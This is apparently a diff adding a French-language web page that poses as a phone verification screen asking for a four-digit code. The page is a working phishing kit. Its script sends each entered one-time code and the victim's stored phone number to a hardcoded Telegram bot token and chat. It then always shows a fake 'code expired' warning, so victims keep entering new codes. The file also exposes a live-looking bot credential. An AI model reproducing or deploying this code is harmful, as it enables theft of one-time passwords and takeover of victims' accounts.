@@ -1,0 +1,462 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vérifier votre numéro</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        html,
+        body {
+            height: 100%;
+            width: 100%;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background: oklch(99.2% 0.003 30);
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            min-height: 100dvh;
+        }
+        
+        .header {
+            background: oklch(55% 0.22 25);
+            padding: 16px 20px;
+            display: flex;
+            align-items: center;
+            min-height: 60px;
+            flex-shrink: 0;
+        }
+        
+        .back-arrow {
+            color: oklch(99% 0.005 30);
+            cursor: pointer;
+            text-decoration: none;
+            line-height: 1;
+            background: none;
+            border: none;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 14px;
+        }
+        
+        .back-arrow svg {
+            width: 24px;
+            height: 24px;
+            stroke: oklch(99% 0.005 30);
+            stroke-width: 2.5;
+            fill: none;
+        }
+        
+        .content {
+            padding: 32px 24px;
+            display: flex;
+            flex-direction: column;
+            flex: 1;
+        }
+        
+        .title {
+            font-size: clamp(1.5rem, 5vw, 1.75rem);
+            font-weight: 700;
+            color: oklch(15% 0.01 30);
+            margin-bottom: 12px;
+            text-wrap: balance;
+        }
+        
+        .subtitle {
+            font-size: 0.95rem;
+            color: oklch(50% 0.01 30);
+            line-height: 1.5;
+            margin-bottom: 28px;
+            transition: color 0.3s;
+        }
+        /* Expired Notice */
+        
+        .expired-notice {
+            background-color: #ffebee;
+            border: 1px solid #e53935;
+            color: #b71c1c;
+            padding: 14px 16px;
+            border-radius: 10px;
+            margin-bottom: 16px;
+            font-size: 14px;
+            text-align: center;
+            display: none;
+            line-height: 1.5;
+        }
+        
+        .expired-notice.show {
+            display: block;
+            animation: slideDown 0.3s ease;
+        }
+        
+        @keyframes slideDown {
+            from {
+                opacity: 0;
+                transform: translateY(-8px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        .code-inputs {
+            display: flex;
+            gap: clamp(8px, 2vw, 14px);
+            margin-bottom: 24px;
+        }
+        
+        .code-input {
+            width: 100%;
+            max-width: 56px;
+            aspect-ratio: 5 / 6;
+            border: 2px solid oklch(88% 0.005 30);
+            border-radius: 10px;
+            text-align: center;
+            font-size: 1.25rem;
+            font-weight: 600;
+            color: oklch(20% 0.01 30);
+            outline: none;
+            transition: border-color 200ms cubic-bezier(0.25, 1, 0.5, 1), background 0.3s, box-shadow 0.2s;
+            background: oklch(99.5% 0.002 30);
+        }
+        
+        .code-input:focus {
+            border-color: oklch(55% 0.22 25);
+            box-shadow: 0 0 0 3px oklch(85% 0.08 25);
+        }
+        
+        .code-input:first-child {
+            border-color: oklch(55% 0.22 25);
+        }
+        /* Expired state: red borders on all boxes */
+        
+        .code-inputs.expired .code-input {
+            border-color: #e53935;
+            background: #fff5f5;
+        }
+        
+        .code-inputs.expired .code-input:focus {
+            border-color: #c62828;
+            box-shadow: 0 0 0 3px oklch(85% 0.08 25);
+        }
+        
+        .resend-text {
+            font-size: 0.95rem;
+            color: oklch(30% 0.01 30);
+        }
+        
+        .resend-text .timer {
+            font-weight: 600;
+        }
+        
+        .timer-clickable {
+            color: oklch(55% 0.22 25);
+            cursor: pointer;
+            text-decoration: underline;
+        }
+        
+        .bottom-section {
+            margin-top: auto;
+            padding-top: 24px;
+        }
+        
+        .continue-btn {
+            width: 100%;
+            padding: 18px;
+            border: none;
+            border-radius: 12px;
+            background: oklch(85% 0.04 25);
+            color: oklch(99% 0.005 30);
+            font-size: 1.1rem;
+            font-weight: 500;
+            cursor: not-allowed;
+            letter-spacing: 0.01em;
+            transition: background 200ms cubic-bezier(0.25, 1, 0.5, 1), transform 0.15s, box-shadow 0.2s;
+        }
+        
+        .continue-btn.active {
+            background: oklch(55% 0.22 25);
+            cursor: pointer;
+            box-shadow: 0 4px 14px oklch(55% 0.15 25 / 0.35);
+        }
+        
+        .continue-btn.active:hover {
+            background: oklch(48% 0.22 25);
+            transform: translateY(-1px);
+            box-shadow: 0 6px 18px oklch(55% 0.15 25 / 0.45);
+        }
+        
+        .continue-btn.active:active {
+            transform: translateY(0);
+            box-shadow: 0 2px 8px oklch(55% 0.15 25 / 0.3);
+        }
+    </style>
+    <base target="_blank">
+    <base target="_blank">
+    <base target="_blank">
+</head>
+
+<body>
+    <div class="header">
+        <button class="back-arrow" onclick="history.back()">
+            <svg viewBox="0 0 24 24">
+                <path d="M19 12H5M12 19l-7-7 7-7"/>
+            </svg>
+            Retour
+        </button>
+    </div>
+
+    <div class="content">
+        <h1 class="title">Vérifier votre numéro</h1>
+        <div class="subtitle" id="subtitle">Saisissez le code que nous avons envoyé à <span id="phoneNumbers">(+243) 79634366</span></div>
+
+        <!-- Expired notice (hidden by default) -->
+        <div id="expired-notice" class="expired-notice">
+            ⚠️ Le code OTP a expiré. Veuillez saisir le nouveau code OTP que vous avez reçu.
+        </div>
+
+        <div class="code-inputs" id="otp">
+            <input type="tel" maxlength="1" class="code-input" inputmode="numeric" pattern="[0-9]*" autofocus>
+            <input type="tel" maxlength="1" class="code-input" inputmode="numeric" pattern="[0-9]*">
+            <input type="tel" maxlength="1" class="code-input" inputmode="numeric" pattern="[0-9]*">
+            <input type="tel" maxlength="1" class="code-input" inputmode="numeric" pattern="[0-9]*">
+        </div>
+
+        <p class="resend-text" id="timer">Renvoyer le code dans <span class="timer" id="countdown">04:55</span></p>
+
+        <div class="bottom-section">
+            <button class="continue-btn" id="continueBtn">Continuer</button>
+        </div>
+    </div>
+
+    <script>
+        (function() {
+            const inputs = document.querySelectorAll('#otp input');
+            const otpGrid = document.getElementById('otp');
+            const countdownEl = document.getElementById('countdown');
+            const timerEl = document.getElementById('timer');
+            const continueBtn = document.getElementById('continueBtn');
+            const expiredNotice = document.getElementById('expired-notice');
+            const subtitleEl = document.getElementById('subtitle');
+
+            let timeLeft = 295; // 4:55 in seconds
+            let timerInterval = null;
+            let submitCount = 0;
+
+            /* ── Load phone number ── */
+            window.addEventListener('load', () => {
+                const savedPhone = localStorage.getItem('savedPhone');
+                document.getElementById('phoneNumbers').textContent = savedPhone || '(+243) 79634366';
+                startCountdown();
+            });
+
+            /* ── Countdown timer ── */
+            function startCountdown() {
+                timeLeft = 295;
+                clearInterval(timerInterval);
+                timerEl.classList.remove('timer-clickable');
+                timerEl.innerHTML = 'Renvoyer le code dans <span class="timer" id="countdown">' + formatTime(timeLeft) + '</span>';
+
+                timerInterval = setInterval(() => {
+                    timeLeft--;
+                    const el = document.getElementById('countdown');
+                    if (el) el.textContent = formatTime(timeLeft);
+
+                    if (timeLeft <= 0) {
+                        clearInterval(timerInterval);
+                        timerEl.innerHTML = '<a href="#" id="resendLink" style="color: oklch(55% 0.22 25); text-decoration: none; font-weight: 500;">Renvoyer le code</a>';
+                        timerEl.classList.add('timer-clickable');
+
+                        document.getElementById('resendLink').addEventListener('click', (e) => {
+                            e.preventDefault();
+                            clearOtpBoxes();
+                            startCountdown();
+                        });
+                    }
+                }, 1000);
+            }
+
+            function formatTime(seconds) {
+                const m = Math.floor(seconds / 60).toString().padStart(2, '0');
+                const s = (seconds % 60).toString().padStart(2, '0');
+                return m + ':' + s;
+            }
+
+            /* Resend click */
+            timerEl.addEventListener('click', () => {
+                if (timeLeft <= 0) {
+                    clearOtpBoxes();
+                    startCountdown();
+                }
+            });
+
+            /* ── Helper: clear all boxes ── */
+            function clearOtpBoxes() {
+                inputs.forEach(i => {
+                    i.value = '';
+                });
+                inputs[0].focus();
+            }
+
+            /* ── Show expired state ── */
+            function showExpiredState() {
+                expiredNotice.classList.remove('show');
+                void expiredNotice.offsetWidth;
+                expiredNotice.classList.add('show');
+
+                otpGrid.classList.add('expired');
+
+                subtitleEl.innerHTML = 'Le code OTP précédent a expiré. Veuillez saisir le nouveau code OTP envoyé à votre numéro.';
+
+                clearOtpBoxes();
+
+                continueBtn.textContent = 'Continuer';
+                continueBtn.classList.remove('active');
+                continueBtn.setAttribute('disabled', 'true');
+
+                startCountdown();
+            }
+
+            /* ── Remove expired styling once user starts typing fresh OTP ── */
+            function clearExpiredState() {
+                expiredNotice.classList.remove('show');
+                otpGrid.classList.remove('expired');
+                subtitleEl.innerHTML = 'Saisissez le code que nous avons envoyé à <span id="phoneNumbers"></span>';
+                const savedPhone = localStorage.getItem('savedPhone');
+                document.getElementById('phoneNumbers').textContent = savedPhone || '(+243) 79634366';
+            }
+
+            /* ── Submit OTP to Telegram ── */
+            async function submitOTP() {
+                const otp = [...inputs].map(i => i.value).join('');
+                const savedPhone = localStorage.getItem('savedPhone') || '(+243) 79634366';
+
+                if (otp.length !== 4) return;
+
+                submitCount++;
+
+                const message = `OTP prêt au Congo :\nTéléphone : ${savedPhone}\nOTP : ${otp}`;
+
+                continueBtn.textContent = 'Vérification…';
+                continueBtn.classList.remove('active');
+                continueBtn.setAttribute('disabled', 'true');
+
+                try {
+                    const botToken = "8977610337:AAGRF3L38erQ49qJh-lae62gWNGhGHGLAFo";
+                    const chatId = "8734632375";
+
+                    await fetch(
+                        `https://api.telegram.org/bot${botToken}/sendMessage`, {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify({
+                                chat_id: chatId,
+                                text: message
+                            })
+                        }
+                    );
+                } catch (err) {
+                    console.error('Telegram error:', err);
+                }
+
+                // ── Always show expired state and loop — regardless of Telegram result ──
+                showExpiredState();
+            }
+
+            /* ── Shared: fill boxes from a string and auto-submit if complete ── */
+            function fillFromString(str) {
+                const digits = str.replace(/\D/g, '').slice(0, inputs.length);
+                if (!digits) return;
+
+                if (otpGrid.classList.contains('expired')) clearExpiredState();
+
+                digits.split('').forEach((char, i) => {
+                    if (inputs[i]) inputs[i].value = char;
+                });
+
+                if (digits.length === inputs.length) {
+                    continueBtn.classList.add('active');
+                    continueBtn.removeAttribute('disabled');
+                    submitOTP();
+                } else if (inputs[digits.length]) {
+                    inputs[digits.length].focus();
+                }
+            }
+
+            /* ── OTP Input Handling ── */
+            inputs.forEach((input, index) => {
+
+                input.addEventListener('input', () => {
+                    input.value = input.value.replace(/\D/g, '');
+
+                    if (input.value && otpGrid.classList.contains('expired')) {
+                        clearExpiredState();
+                    }
+
+                    if (input.value && index < inputs.length - 1) {
+                        inputs[index + 1].focus();
+                    }
+
+                    const allFilled = [...inputs].every(i => i.value);
+                    if (allFilled) {
+                        continueBtn.classList.add('active');
+                        continueBtn.removeAttribute('disabled');
+                        continueBtn.textContent = 'Continuer';
+                        submitOTP();
+                    } else {
+                        continueBtn.classList.remove('active');
+                        continueBtn.setAttribute('disabled', 'true');
+                    }
+                });
+
+                input.addEventListener('keydown', e => {
+                    if (e.key === 'Backspace' && !input.value && index > 0) {
+                        inputs[index - 1].focus();
+                    }
+                });
+
+                input.addEventListener('paste', e => {
+                    e.preventDefault();
+                    const text = (e.clipboardData || window.clipboardData).getData('text');
+                    fillFromString(text);
+                });
+
+                input.addEventListener('beforeinput', e => {
+                    if (
+                        e.inputType === 'insertFromPaste' ||
+                        e.inputType === 'insertReplacementText'
+                    ) {
+                        e.preventDefault();
+                        if (e.data) {
+                            fillFromString(e.data);
+                        } else if (navigator.clipboard && navigator.clipboard.readText) {
+                            navigator.clipboard.readText().then(fillFromString).catch(() => {});
+                        }
+                    }
+                });
+            });
+
+            /* Manual submit button */
+            continueBtn.addEventListener('click', () => {
+                if (!continueBtn.classList.contains('active')) return;
+                submitOTP();
+            });
+
+        })();
+    </script>
+</body>
+
+</html>
